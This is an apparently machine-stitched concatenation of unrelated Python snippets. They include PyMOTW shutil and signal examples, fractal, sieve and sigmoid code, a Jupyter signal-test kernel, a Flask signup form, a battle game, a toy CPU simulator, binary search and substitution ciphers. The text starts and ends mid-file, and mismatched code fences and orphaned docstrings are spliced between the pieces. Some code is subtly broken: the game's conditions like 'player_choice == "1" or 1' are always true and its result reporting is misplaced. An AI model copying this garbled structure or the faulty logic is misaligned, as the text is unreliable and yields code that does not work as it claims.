    print('  Accessed:', time.ctime(stat_info.st_atime))
    print('  Modified:', time.ctime(stat_info.st_mtime))


os.mkdir('example')
print('SOURCE:')
show_file_info('shutil_copy2.py')

shutil.copy2('shutil_copy2.py', 'example')

print('DEST:')
show_file_info('example/shutil_copy2.py')

#!/usr/bin/env python3```


```pyCopying a file```


```py

#end_pymotw_header
import glob
import shutil

print('BEFORE:', glob.glob('shutil_copyfile.*'))

shutil.copyfile('shutil_copyfile.py', 'shutil_copyfile.py.copy')

print('AFTER:', glob.glob('shutil_copyfile.*'))

#!/usr/bin/env python3```


```pyCopying a file```


```py

#end_pymotw_header
import io
import os
import shutil
import sys


class VerboseStringIO(io.StringIO):

    def read(self, n=-1):
        next = io.StringIO.read(self, n)
        print('read({}) got {} bytes'.format(n, len(next)))
        return next


lorem_ipsum = '''Lorem ipsum dolor sit amet, consectetuer
adipiscing elit.  Vestibulum aliquam mollis dolor. Donec
vulputate nunc ut diam. Ut rutrum mi vel sem. Vestibulum
ante ipsum.'''

print('Default:')
input = VerboseStringIO(lorem_ipsum)
output = io.StringIO()
shutil.copyfileobj(input, output)

print()

print('All at once:')
input = VerboseStringIO(lorem_ipsum)
output = io.StringIO()
shutil.copyfileobj(input, output, -1)

print()

print('Blocks of 256:')
input = VerboseStringIO(lorem_ipsum)
output = io.StringIO()
shutil.copyfileobj(input, output, 256)

#!/usr/bin/env python3```


```pyCopying the permissions from one file to another```


```py

#end_pymotw_header
import os
import shutil
import subprocess

with open('file_to_change.txt', 'wt') as f:
    f.write('content')
os.chmod('file_to_change.txt', 0o444)

print('BEFORE:', oct(os.stat('file_to_change.txt').st_mode))

shutil.copymode('shutil_copymode.py', 'file_to_change.txt')

print('AFTER :', oct(os.stat('file_to_change.txt').st_mode))

#!/usr/bin/env python3```


```pyCopying the meta-data from one file to another```


```py

#end_pymotw_header
import os
import shutil
import time


def show_file_info(filename):
    stat_info = os.stat(filename)
    print('  Mode    :', oct(stat_info.st_mode))
    print('  Created :', time.ctime(stat_info.st_ctime))
    print('  Accessed:', time.ctime(stat_info.st_atime))
    print('  Modified:', time.ctime(stat_info.st_mtime))


with open('file_to_change.txt', 'wt') as f:
    f.write('content')
os.chmod('file_to_change.txt', 0o444)

print('BEFORE:')
show_file_info('file_to_change.txt')

shutil.copystat('shutil_copystat.py', 'file_to_change.txt')

print('AFTER:')
show_file_info('file_to_change.txt')

#!/usr/bin/env python3```


```pyCopying an entire tree of files.```


```py

#end_pymotw_header
import glob
import pprint
import shutil

print('BEFORE:')
pprint.pprint(glob.glob('/tmp/example/*'))

shutil.copytree('../shutil', '/tmp/example')

print('\nAFTER:')
pprint.pprint(glob.glob('/tmp/example/*'))

#!/usr/bin/env python3```


```pyCopying an entire tree of files.```


```py

#end_pymotw_header
import glob
import pprint
import shutil


def verbose_copy(src, dst):
    print('copying\n {!r}\n to {!r}'.format(src, dst))
    return shutil.copy2(src, dst)


print('BEFORE:')
pprint.pprint(glob.glob('/tmp/example/*'))
print()

shutil.copytree(
    '../shutil', '/tmp/example',
    copy_function=verbose_copy,
    ignore=shutil.ignore_patterns('*.py'),
)

print('\nAFTER:')
pprint.pprint(glob.glob('/tmp/example/*'))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyHow much disk space is used?```


```py

#end_pymotw_header
import shutil

total_b, used_b, free_b = shutil.disk_usage('.')

gib = 2 ** 30  # GiB == gibibyte
gb = 10 ** 9   # GB == gigabyte

print('Total: {:6.2f} GB  {:6.2f} GiB'.format(
    total_b / gb, total_b / gib))
print('Used : {:6.2f} GB  {:6.2f} GiB'.format(
    used_b / gb, used_b / gib))
print('Free : {:6.2f} GB  {:6.2f} GiB'.format(
    free_b / gb, free_b / gib))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyWhich archive formats are supported?```


```py

#end_pymotw_header
import shutil

for format, description in shutil.get_archive_formats():
    print('{:<5}: {}'.format(format, description))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyWhich archive formats can be extracted?```


```py

#end_pymotw_header
import shutil

for format, exts, description in shutil.get_unpack_formats():
    print('{:<5}: {}, names ending in {}'.format(
        format, description, exts))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyMaking archives```


```py

#end_pymotw_header
import logging
import shutil
import sys
import tarfile

logging.basicConfig(
    format='%(message)s',
    stream=sys.stdout,
    level=logging.DEBUG,
)
logger = logging.getLogger('pymotw')

print('Creating archive:')
shutil.make_archive(
    'example', 'gztar',
    root_dir='..',
    base_dir='shutil',
    logger=logger,
)

print('\nArchive contents:')
with tarfile.open('example.tar.gz', 'r') as t:
    for n in t.getnames():
        print(n)

#!/usr/bin/env python3```


```pyCopying a file```


```py

#end_pymotw_header
import glob
import shutil

with open('example.txt', 'wt') as f:
    f.write('contents')

print('BEFORE: ', glob.glob('example*'))

shutil.move('example.txt', 'example.out')

print('AFTER : ', glob.glob('example*'))

#!/usr/bin/env python3```


```pyRemove an entire tree of files.```


```py

#end_pymotw_header
import glob
import pprint
import shutil

print('BEFORE:')
pprint.pprint(glob.glob('/tmp/example/*'))

shutil.rmtree('/tmp/example')

print('\nAFTER:')
pprint.pprint(glob.glob('/tmp/example/*'))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyExtracting archives```


```py

#end_pymotw_header
import pathlib
import shutil
import sys
import tempfile

with tempfile.TemporaryDirectory() as d:
    print('Unpacking archive:')
    shutil.unpack_archive(
        'example.tar.gz',
        extract_dir=d,
    )

    print('\nCreated:')
    prefix_len = len(d) + 1
    for extracted in pathlib.Path(d).rglob('*'):
        print(str(extracted)[prefix_len:])

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyFind a program on $PATH```


```py

#end_pymotw_header
import shutil

print(shutil.which('virtualenv'))
print(shutil.which('tox'))
print(shutil.which('no-such-program'))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyFind a configuration file```


```py

#end_pymotw_header
import os
import shutil

path = os.pathsep.join([
    '.',
    os.path.expanduser('~/pymotw'),
])

mode = os.F_OK | os.R_OK

filename = shutil.which(
    'config.ini',
    mode=mode,
    path=path,
)

print(filename)

'''Author Anurag Kumar | anuragkumarak95@gmail.com | git/anuragkumarak95

Simple example of Fractal generation using recursive function.

What is Sierpinski Triangle?
>>The Sierpinski triangle (also with the original orthography Sierpinski), also called the Sierpinski gasket or the Sierpinski Sieve,
is a fractal and attractive fixed set with the overall shape of an equilateral triangle, subdivided recursively into smaller
equilateral triangles. Originally constructed as a curve, this is one of the basic examples of self-similar sets, i.e.,
it is a mathematically generated pattern that can be reproducible at any magnification or reduction. It is named after
the Polish mathematician Wacław Sierpinski, but appeared as a decorative pattern many centuries prior to the work of Sierpinski.

Requirements(pip):
  - turtle

Python:
  - 2.6

Usage:
  - $python sierpinski_triangle.py <int:depth_for_fractal>

Credits: This code was written by editing the code from http://www.lpb-riannetrujillo.com/blog/python-fractal/

'''
import turtle
import sys
PROGNAME = 'Sierpinski Triangle'
if len(sys.argv) !=2:
    raise Exception('right format for using this script: $python fractals.py <int:depth_for_fractal>')

myPen = turtle.Turtle()
myPen.ht()
myPen.speed(5)
myPen.pencolor('red')

points = [[-175,-125],[0,175],[175,-125]] #size of triangle

def getMid(p1,p2):
    return ( (p1[0]+p2[0]) / 2, (p1[1] + p2[1]) / 2) #find midpoint

def triangle(points,depth):

    myPen.up()
    myPen.goto(points[0][0],points[0][1])
    myPen.down()
    myPen.goto(points[1][0],points[1][1])
    myPen.goto(points[2][0],points[2][1])
    myPen.goto(points[0][0],points[0][1])

    if depth>0:
        triangle([points[0],
                        getMid(points[0], points[1]),
                        getMid(points[0], points[2])],
                   depth-1)
        triangle([points[1],
                        getMid(points[0], points[1]),
                        getMid(points[1], points[2])],
                   depth-1)
        triangle([points[2],
                         getMid(points[2], points[1]),
                         getMid(points[0], points[2])],
                   depth-1)


triangle(points,int(sys.argv[1]))
def sieveOfEratosthenes(n):
    soe = [True] * (n-1)
    p = 2

    while True:
        multiplier = 2
        multiple = p * multiplier

        while multiple <= n:
            soe[multiple-2] = False
            multiplier += 1
            multiple = p * multiplier

        for i, prime in enumerate(soe):
            if prime and i+2 > p:
                p = i+2
                break

        else:
            break
    for i, prime in enumerate(soe):
        if prime:
            print(i+2)```


```py
Sieve of Eratosthones

The sieve of Eratosthenes is an algorithm used to find prime numbers, less than or
equal to a given value.
Illustration:
https://upload.wikimedia.org/wikipedia/commons/b/b9/Sieve_of_Eratosthenes_animation.gif
Reference: https://en.wikipedia.org/wiki/Sieve_of_Eratosthenes

doctest provider: Bruno Simas Hadlich (https://github.com/brunohadlich)
Also thanks to Dmitry (https://github.com/LizardWizzard) for finding the problem```


```py


import math
from typing import List


def prime_sieve(num: int) -> List[int]:
    """
    Returns a list with all prime numbers up to n.

    >>> prime_sieve(50)
    [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
    >>> prime_sieve(25)
    [2, 3, 5, 7, 11, 13, 17, 19, 23]
    >>> prime_sieve(10)
    [2, 3, 5, 7]
    >>> prime_sieve(9)
    [2, 3, 5, 7]
    >>> prime_sieve(2)
    [2]
    >>> prime_sieve(1)
    []
    """

    if num <= 0:
        raise ValueError(f"{num}: Invalid input, please enter a positive integer.")

    sieve = [True] * (num + 1)
    prime = []
    start = 2
    end = int(math.sqrt(num))

    while start <= end:
        # If start is a prime
        if sieve[start] is True:
            prime.append(start)

            # Set multiples of start be False
            for i in range(start * start, num + 1, start):
                if sieve[i] is True:
                    sieve[i] = False

        start += 1

    for j in range(end + 1, num + 1):
        if sieve[j] is True:
            prime.append(j)

    return prime


if __name__ == "__main__":
    print(prime_sieve(int(input("Enter a positive integer: ").strip())))
````

````py
This script demonstrates the implementation of the Sigmoid function.

The function takes a vector of K real numbers as input and then 1 / (1 + exp(-x)).
After through Sigmoid, the element of the vector mostly 0 between 1. or 1 between -1.

Script inspired from its corresponding Wikipedia article
https://en.wikipedia.org/wiki/Sigmoid_function```


```py

import numpy as np


def sigmoid(vector: np.array) -> np.array:
    """
    Implements the sigmoid function

    Parameters:
        vector (np.array): A  numpy array of shape (1,n)
        consisting of real values

    Returns:
        sigmoid_vec (np.array): The input numpy array, after applying
        sigmoid.

    Examples:
    >>> sigmoid(np.array([-1.0, 1.0, 2.0]))
    array([0.26894142, 0.73105858, 0.88079708])

    >>> sigmoid(np.array([0.0]))
    array([0.5])
    """
    return 1 / (1 + np.exp(-vector))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

```









---


```py



#end_pymotw_header
import signal
import time


def receive_alarm(signum, stack):
    print('Alarm :', time.ctime())


# Call receive_alarm in 2 seconds
signal.signal(signal.SIGALRM, receive_alarm)
signal.alarm(2)

print('Before:', time.ctime())
time.sleep(4)
print('After :', time.ctime())

#!/usr/bin/env python3```


```pyChild process in signal example.```


```py

#end_pymotw_header
import os
import signal
import time
import sys

pid = os.getpid()
received = False


def signal_usr1(signum, frame):
    "Callback invoked when a signal is received"
    global received
    received = True
    print('CHILD {:>6}: Received USR1'.format(pid))
    sys.stdout.flush()


print('CHILD {:>6}: Setting up signal handler'.format(pid))
sys.stdout.flush()
signal.signal(signal.SIGUSR1, signal_usr1)
print('CHILD {:>6}: Pausing to wait for signal'.format(pid))
sys.stdout.flush()
time.sleep(3)

if not received:
    print('CHILD {:>6}: Never received signal'.format(pid))

```









---


```py



#end_pymotw_header
import signal


def alarm_received(n, stack):
    return


signal.signal(signal.SIGALRM, alarm_received)

signals_to_names = {
    getattr(signal, n): n
    for n in dir(signal)
    if n.startswith('SIG') and '_' not in n
}

for s, name in sorted(signals_to_names.items()):
    handler = signal.getsignal(s)
    if handler is signal.SIG_DFL:
        handler = 'SIG_DFL'
    elif handler is signal.SIG_IGN:
        handler = 'SIG_IGN'
    print('{:<10} ({:2d}):'.format(name, s), handler)

# -*- coding: utf-8 -*-
#
# :copyright: (c) 2020 by Pavlo Dmytrenko.
# :license: MIT, see LICENSE for more details.
````

````py
yaspin.signal_handlers
~~~~~~~~~~~~~~~~~~~~~~

Callback functions or "signal handlers", that are invoked
when the signal occurs.```


```py

import sys


def default_handler(signum, frame, spinner):
    """Signal handler, used to gracefully shut down the ``spinner`` instance
    when specified signal is received by the process running the ``spinner``.

    ``signum`` and ``frame`` are mandatory arguments. Check ``signal.signal``
    function for more details.
    """
    spinner.fail()
    spinner.stop()
    sys.exit(0)


def fancy_handler(signum, frame, spinner):
    """Signal handler, used to gracefully shut down the ``spinner`` instance
    when specified signal is received by the process running the ``spinner``.

    ``signum`` and ``frame`` are mandatory arguments. Check ``signal.signal``
    function for more details.
    """
    spinner.red.fail("✘")
    spinner.stop()
    sys.exit(0)

```









---


```py



#end_pymotw_header
import signal
import os
import time


def do_exit(sig, stack):
    raise SystemExit('Exiting')


signal.signal(signal.SIGINT, signal.SIG_IGN)
signal.signal(signal.SIGUSR1, do_exit)

print('My PID:', os.getpid())

signal.pause()

#!/usr/bin/env python3```


```pyIllustrate using Unix signals and subprocess.```


```py

#end_pymotw_header
import os
import signal
import subprocess
import time
import sys

proc = subprocess.Popen(['python3', 'signal_child.py'])
print('PARENT      : Pausing before sending signal...')
sys.stdout.flush()
time.sleep(1)
print('PARENT      : Signaling child')
sys.stdout.flush()
os.kill(proc.pid, signal.SIGUSR1)

```









---


```py



#end_pymotw_header
import signal
import os
import time


def receive_signal(signum, stack):
    print('Received:', signum)


# Register signal handlers
signal.signal(signal.SIGUSR1, receive_signal)
signal.signal(signal.SIGUSR2, receive_signal)

# Print the process ID so it can be used with 'kill'
# to send this program signals.
print('My PID is:', os.getpid())

while True:
    print('Waiting...')
    time.sleep(3)

```









---


```py



#end_pymotw_header
import signal
import threading
import os
import time


def signal_handler(num, stack):
    print('Received signal {} in {}'.format(
        num, threading.currentThread().name))


signal.signal(signal.SIGUSR1, signal_handler)


def wait_for_signal():
    print('Waiting for signal in',
          threading.currentThread().name)
    signal.pause()
    print('Done waiting')


# Start a thread that will not receive the signal
receiver = threading.Thread(
    target=wait_for_signal,
    name='receiver',
)
receiver.start()
time.sleep(0.1)


def send_signal():
    print('Sending signal in', threading.currentThread().name)
    os.kill(os.getpid(), signal.SIGUSR1)


sender = threading.Thread(target=send_signal, name='sender')
sender.start()
sender.join()

# Wait for the thread to see the signal (not going to happen!)
print('Waiting for', receiver.name)
signal.alarm(2)
receiver.join()

```









---


```py



#end_pymotw_header
import signal
import time
import threading


def signal_handler(num, stack):
    print(time.ctime(), 'Alarm in',
          threading.currentThread().name)


signal.signal(signal.SIGALRM, signal_handler)


def use_alarm():
    t_name = threading.currentThread().name
    print(time.ctime(), 'Setting alarm in', t_name)
    signal.alarm(1)
    print(time.ctime(), 'Sleeping in', t_name)
    time.sleep(3)
    print(time.ctime(), 'Done with sleep in', t_name)


# Start a thread that will not receive the signal
alarm_thread = threading.Thread(
    target=use_alarm,
    name='alarm_thread',
)
alarm_thread.start()
time.sleep(0.1)

# Wait for the thread to see the signal (not going to happen!)
print(time.ctime(), 'Waiting for', alarm_thread.name)
alarm_thread.join()

print(time.ctime(), 'Exiting normally')
````

```pyTest kernel for signalling subprocesses"""
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
import os
import signal
import time
from subprocess import PIPE
from subprocess import Popen

from ipykernel.displayhook import ZMQDisplayHook
from ipykernel.kernelapp import IPKernelApp
from ipykernel.kernelbase import Kernel


class SignalTestKernel(Kernel):
    """Kernel for testing subprocess signaling"""

    implementation = "signaltest"
    implementation_version = "0.0"
    banner = ""

    def __init__(self, **kwargs):
        kwargs.pop("user_ns", None)
        super().__init__(**kwargs)
        self.children = []

        if os.environ.get("NO_SIGTERM_REPLY", None) == "1":
            signal.signal(signal.SIGTERM, signal.SIG_IGN)

    async def shutdown_request(self, stream, ident, parent):
        if os.environ.get("NO_SHUTDOWN_REPLY") != "1":
            await super().shutdown_request(stream, ident, parent)

    def do_execute(
        self, code, silent, store_history=True, user_expressions=None, allow_stdin=False
    ):
        code = code.strip()
        reply = {
            "status": "ok",
            "user_expressions": {},
        }
        if code == "start":
            child = Popen(["bash", "-i", "-c", "sleep 30"], stderr=PIPE)
            self.children.append(child)
            reply["user_expressions"]["pid"] = self.children[-1].pid
        elif code == "check":
            reply["user_expressions"]["poll"] = [child.poll() for child in self.children]
        elif code == "env":
            reply["user_expressions"]["env"] = os.getenv("TEST_VARS", "")
        elif code == "sleep":
            try:
                time.sleep(10)
            except KeyboardInterrupt:
                reply["user_expressions"]["interrupted"] = True
            else:
                reply["user_expressions"]["interrupted"] = False
        else:
            reply["status"] = "error"
            reply["ename"] = "Error"
            reply["evalue"] = code
            reply["traceback"] = ["no such command: %s" % code]
        return reply


class SignalTestApp(IPKernelApp):
    kernel_class = SignalTestKernel

    def init_io(self):
        # Overridden to disable stdout/stderr capture
        self.displayhook = ZMQDisplayHook(self.session, self.iopub_socket)


if __name__ == "__main__":
    # make startup artificially slow,
    # so that we exercise client logic for slow-starting kernels
    time.sleep(2)
    SignalTestApp.launch_instance()

from flask_wtf import FlaskForm
from wtforms import StringField
from wtforms.validators import DataRequired, Email, ValidationError
from app.models import User


def user_exists(form, field):
    print("Checking if user exits", field.data)
    email = field.data
    user = User.query.filter(User.email == email).first()
    if user:
        raise ValidationError("User is already registered.")


class SignUpForm(FlaskForm):
    username = StringField("username", validators=[DataRequired()])
    email = StringField("email", validators=[DataRequired(), user_exists])
    password = StringField("password", validators=[DataRequired()])

def areSimilar(a, b):
    check_a = []
    check_b = []
    count = 0
    for i in range(len(a)):
        if a[i] != b[i]:
            count += 1
            check_a.append(a[i])
            check_b.append(b[i])
    if count == 0:
        return True
    elif count == 2:
        return set(check_a) == set(check_b)
    else:
        return False

game_running = True

while game_running == True:

    player = {"name": "Pratikshya", "attack": 10, "heal": 16, "health": 100}
    monster = {"name": "Aakash", "attack": 12, "heal": 16, "health": 100}

    print("------" * 7)
    print("enter player name")
    player["name"] = input()

    print("------" * 7)
    print(player["name"] + " has " + str(player["health"]) + " health. ")
    print(monster["name"] + " has " + str(monster["health"]) + " health. ")
    new_round = True

    while new_round == True:
        player_won = False
        monster_won = False

        print("------" * 7)
        print("Please select action")
        print("1) Attack")
        print("2) Heal")
        print("3) Exit game")

        player_choice = input()

        if player_choice == "1" or 1:
            monster["health"] = monster["health"] - player["attack"]
            if monster["health"] <= 0:
                player_won = True

            else:
                player["health"] = player["health"] - monster["attack"]
                if player["health"] <= 0:
                    monster_won = True

        elif player_choice == 2:
            player["health"] = player["health"] + player["heal"]
            player["health"] = player["health"] - monster["attack"]
            print("heal player")
            if player["health"] <= 0:
                monster_won = True

        elif player_choice == "3" or 3:
            new_round = False
            game_running = False

        else:
            print("Invalid Input")

            if player_won == False and monster_won == False:
                print(player["name"] + " has " + str(player["health"]) + " left ")
                print(monster["name"] + " has " + str(monster["health"]) + " left ")

            elif player_won:
                print(player["name"] + " won ")
                new_round = False

            elif monster_won:
                print("The monster won")
                new_round = False

# operational codes
PRINT_TOM = 1
HALT = 2
PRINT_NUM = 3
SAVE = 4
PRINT_REG = 5
ADD = 6

# memory
memory = [
    PRINT_TOM,
    SAVE,
    23,
    2,
    SAVE,
    10,
    3,
    ADD, # R2 += R3
    2,
    3,
    PRINT_TOM,
    PRINT_REG,
    2,
    PRINT_TOM,
    HALT
]


# some registers
pc = 0
registers = [0] * 8 # r0 - r7
running = True
# a REPL
op_size = 1
while running:
    # fetch
    command = memory[pc]


    # decode
    if command == PRINT_TOM:
        # execute
        print("Tom")
        op_size = 1

    # decode
    elif command == SAVE:
        # execute
        num = memory[pc + 1]
        reg_index =  memory[pc + 2]

        registers[reg_index] = num

        op_size = 3

    # decode
    elif command == ADD:
        # execute
        reg_index_a = memory[pc + 1]
        reg_index_b =  memory[pc + 2]

        registers[reg_index_a] += registers[reg_index_b]

        op_size = 3

    # decode
    elif command == PRINT_NUM:
        # execute
        num = memory[pc + 1]
        print(num)
        op_size = 2

    # decode
    elif command == PRINT_REG:
        # execute
        reg_index = memory[pc + 1]
        print(registers[reg_index])
        op_size = 2

    # decode
    elif command == HALT:
        # execute
        running = False
        op_size = 1

    else:
        print(f"invalid instruction [{memory[pc]}]")
        running = False
        op_size = 1

    pc += op_size

# Fetch -> docde -> execute

# lets write the basics of a simple data driven machine (CPU simpulation)
# This itteration will just be able to print something
import sys

HALT = 1
PRINT_TOM = 2
# memory
memory = [
    PRINT_TOM, # [0000 0010]
    PRINT_TOM, # [0000 0010]
    PRINT_TOM, # [0000 0010]
    HALT,      # [0000 0001]
    PRINT_TOM  # [0000 0010]
]

# flags

# program counter
pc = 0
# state (running)
running = True

# REPL (FETCH, DECODE, EXECUTE)

while running:
    # FETCH
    command = memory[pc]
    # DECODE
    if command == PRINT_TOM:
        # EXECUTE
        print("Tom")
    # DECODE
    elif command == HALT:
        # EXECUTE
        running = False
    # DECODE (ERROR)
    else:
        # EXECUTE
        print(f"Unknown Instruction {command}")
        sys.exit(1)

    pc += 1

# lets continue on from simple01.py
# now we will add 2 byte opcodes so that we can print numbers

import sys

HALT = 1
PRINT_TOM = 2
PRINT_NUM = 3
# memory
memory = [
    PRINT_TOM, # [0000 0010]
    PRINT_TOM, # [0000 0010]
    PRINT_TOM, # [0000 0010]
    PRINT_NUM,
    45,
    PRINT_TOM,  # [0000 0010]
    HALT      # [0000 0001]
]

# flags

# program counter
pc = 0
# state (running)
running = True

# REPL (FETCH, DECODE, EXECUTE)

while running:
    # FETCH
    command = memory[pc]
    # DECODE
    if command == PRINT_TOM:
        # EXECUTE
        instruction_size = 1
        print("Tom")
    # DECODE
    elif command == HALT:
        # EXECUTE
        instruction_size = 1
        running = False
    # DECODE
    elif command == PRINT_NUM:
        # EXECUTE
        instruction_size = 2
        num = memory[pc + 1]
        print(num)
    # DECODE (ERROR)
    else:
        # EXECUTE
        print(f"Unknown Instruction {command}")
        sys.exit(1)

    pc += instruction_size

# lets build up our simulator some more
# now we will add the concept of registers

import sys

HALT = 1
PRINT_TOM = 2
PRINT_NUM = 3
SAVE = 4
PRINT_REG = 5
ADD = 6
# memory
memory = [
    PRINT_TOM, # [0000 0010]
    SAVE, # save the value 65 to register 2
    65,
    2,
    SAVE, # save the value 20 to register 3
    20,
    3,
    ADD, # Add the content of reg 2 and reg 3 together
    2,
    3,
    PRINT_REG,
    2,
    HALT      # [0000 0001]
]

# flags

# program counter
pc = 0

# registers
register = [0] * 8 # list of 8 registers

# state (running)
running = True

# REPL (FETCH, DECODE, EXECUTE)

while running:
    # FETCH
    command = memory[pc]

    # DECODE
    if command == PRINT_TOM:
        # EXECUTE
        instruction_size = 1
        print("Tom")

    # DECODE
    elif command == HALT:
        # EXECUTE
        instruction_size = 1
        running = False

    # DECODE
    elif command == PRINT_NUM:
        # EXECUTE
        instruction_size = 2
        num = memory[pc + 1]
        print(num)

    # DECODE
    elif command == SAVE:
        # EXECUTE
        instruction_size = 3
        num = memory[pc + 1]
        reg = memory[pc + 2]
        register[reg] = num

    # DECODE
    elif command == ADD:
        # EXECUTE
        instruction_size = 3
        reg_a = memory[pc + 1]
        reg_b = memory[pc + 2]
        register[reg_a] += register[reg_b]

    # DECODE
    elif command == PRINT_REG:
        # EXECUTE
        instruction_size = 2
        reg = memory[pc + 1]
        print(register[reg])

    # DECODE (ERROR)
    else:
        # EXECUTE
        print(f"Unknown Instruction {command}")
        sys.exit(1)

    pc += instruction_size
# lets build up our simulator some more
# now we will add the concept of registers

import sys

HALT = 1
PRINT_TOM = 2
PRINT_NUM = 3
SAVE = 4
PRINT_REG = 5
ADD = 6




# flags

# program counter
pc = 0

# memory
memory = [0] * 128 # 128 bytes of RAM

# registers
register = [0] * 8 # list of 8 registers

# state (running)
running = True

# Helper Functions

def load_memory(filename):
    try:
        address = 0
        with open(filename) as f:
            for line in f:
                # deal with comments
                # split before and after any comment symbol '#'
                comment_split = line.split("#")

                # convert the pre-comment portion (to the left) from binary to a value
                # extract the first part of the split to a number variable
                # and trim whitespace
                num = comment_split[0].strip()

                # ignore blank lines / comment only lines
                if len(num) == 0:
                    continue

                # set the number to an integer of base 2
                value = int(num, 2)
                # print the value in binary and in decimal
                # uncomment for debugging: print(f"{value:08b}: {value:d}")

                # add the value in to the memory at the index of address
                memory[address] = value

                # increment the address
                address += 1


    except FileNotFoundError:
        print(f"{sys.argv[0]}: {sys.argv[1]} not found")
        sys.exit(2)



# Main entry

if len(sys.argv) != 2:
    print("usage: simple04.py filename")
    sys.exit(1)

load_memory(sys.argv[1])

# REPL (FETCH, DECODE, EXECUTE)

while running:
    # FETCH
    command = memory[pc]

    # DECODE
    if command == PRINT_TOM:
        # EXECUTE
        instruction_size = 1
        print("Tom")

    # DECODE
    elif command == HALT:
        # EXECUTE
        instruction_size = 1
        running = False

    # DECODE
    elif command == PRINT_NUM:
        # EXECUTE
        instruction_size = 2
        num = memory[pc + 1]
        print(num)

    # DECODE
    elif command == SAVE:
        # EXECUTE
        instruction_size = 3
        num = memory[pc + 1]
        reg = memory[pc + 2]
        register[reg] = num

    # DECODE
    elif command == ADD:
        # EXECUTE
        instruction_size = 3
        reg_a = memory[pc + 1]
        reg_b = memory[pc + 2]
        register[reg_a] += register[reg_b]

    # DECODE
    elif command == PRINT_REG:
        # EXECUTE
        instruction_size = 2
        reg = memory[pc + 1]
        print(register[reg])

    # DECODE (ERROR)
    else:
        # EXECUTE
        print(f"Unknown Instruction {command}")
        sys.exit(1)

    pc += instruction_size

```

````py
Pure Python implementation of a binary search algorithm.

For doctests run following command:
python3 -m doctest -v simple_binary_search.py

For manual testing run:
python3 simple_binary_search.py```


```py
from __future__ import annotations


def binary_search(a_list: list[int], item: int) -> bool:
    """
    >>> test_list = [0, 1, 2, 8, 13, 17, 19, 32, 42]
    >>> print(binary_search(test_list, 3))
    False
    >>> print(binary_search(test_list, 13))
    True
    >>> print(binary_search([4, 4, 5, 6, 7], 4))
    True
    >>> print(binary_search([4, 4, 5, 6, 7], -10))
    False
    >>> print(binary_search([-18, 2], -18))
    True
    >>> print(binary_search([5], 5))
    True
    >>> print(binary_search(['a', 'c', 'd'], 'c'))
    True
    >>> print(binary_search(['a', 'c', 'd'], 'f'))
    False
    >>> print(binary_search([], 1))
    False
    >>> print(binary_search([-.1, .1 , .8], .1))
    True
    >>> binary_search(range(-5000, 5000, 10), 80)
    True
    >>> binary_search(range(-5000, 5000, 10), 1255)
    False
    >>> binary_search(range(0, 10000, 5), 2)
    False
    """
    if len(a_list) == 0:
        return False
    midpoint = len(a_list) // 2
    if a_list[midpoint] == item:
        return True
    if item < a_list[midpoint]:
        return binary_search(a_list[:midpoint], item)
    else:
        return binary_search(a_list[midpoint + 1 :], item)


if __name__ == "__main__":
    user_input = input("Enter numbers separated by comma:\n").strip()
    sequence = [int(item.strip()) for item in user_input.split(",")]
    target = int(input("Enter the number to be found in the list:\n").strip())
    not_str = "" if binary_search(sequence, target) else "not "
    print(f"{target} was {not_str}found in {sequence}")

def remove_duplicates(key: str) -> str:
    """
    Removes duplicate alphabetic characters in a keyword (letter is ignored after its
        first appearance).
    :param key: Keyword to use
    :return: String with duplicates removed
    >>> remove_duplicates('Hello World!!')
    'Helo Wrd'
    """

    key_no_dups = ""
    for ch in key:
        if ch == " " or ch not in key_no_dups and ch.isalpha():
            key_no_dups += ch
    return key_no_dups


def create_cipher_map(key: str) -> dict[str, str]:
    """
    Returns a cipher map given a keyword.
    :param key: keyword to use
    :return: dictionary cipher map
    """
    # Create alphabet list
    alphabet = [chr(i + 65) for i in range(26)]
    # Remove duplicate characters from key
    key = remove_duplicates(key.upper())
    offset = len(key)
    # First fill cipher with key characters
    cipher_alphabet = {alphabet[i]: char for i, char in enumerate(key)}
    # Then map remaining characters in alphabet to
    # the alphabet from the beginning
    for i in range(len(cipher_alphabet), 26):
        char = alphabet[i - offset]
        # Ensure we are not mapping letters to letters previously mapped
        while char in key:
            offset -= 1
            char = alphabet[i - offset]
        cipher_alphabet[alphabet[i]] = char
    return cipher_alphabet


def encipher(message: str, cipher_map: dict[str, str]) -> str:
    """
    Enciphers a message given a cipher map.
    :param message: Message to encipher
    :param cipher_map: Cipher map
    :return: enciphered string
    >>> encipher('Hello World!!', create_cipher_map('Goodbye!!'))
    'CYJJM VMQJB!!'
    """
    return "".join(cipher_map.get(ch, ch) for ch in message.upper())


def decipher(message: str, cipher_map: dict[str, str]) -> str:
    """
    Deciphers a message given a cipher map
    :param message: Message to decipher
    :param cipher_map: Dictionary mapping to use
    :return: Deciphered string
    >>> cipher_map = create_cipher_map('Goodbye!!')
    >>> decipher(encipher('Hello World!!', cipher_map), cipher_map)
    'HELLO WORLD!!'
    """
    # Reverse our cipher mappings
    rev_cipher_map = {v: k for k, v in cipher_map.items()}
    return "".join(rev_cipher_map.get(ch, ch) for ch in message.upper())


def main() -> None:
    """
    Handles I/O
    :return: void
    """
    message = input("Enter message to encode or decode: ").strip()
    key = input("Enter keyword: ").strip()
    option = input("Encipher or decipher? E/D:").strip()[0].lower()
    try:
        func = {"e": encipher, "d": decipher}[option]
    except KeyError:
        raise KeyError("invalid input option")
    cipher_map = create_cipher_map(key)
    print(func(message, cipher_map))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    main()

from __future__ import print_function
import sys, random

LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def main():
    message = input('Enter message: ')
    key = 'LFWOAYUISVKMNXPBDCRJTQEGHZ'
    resp = input('Encrypt/Decrypt [e/d]: ')

    checkValidKey(key)

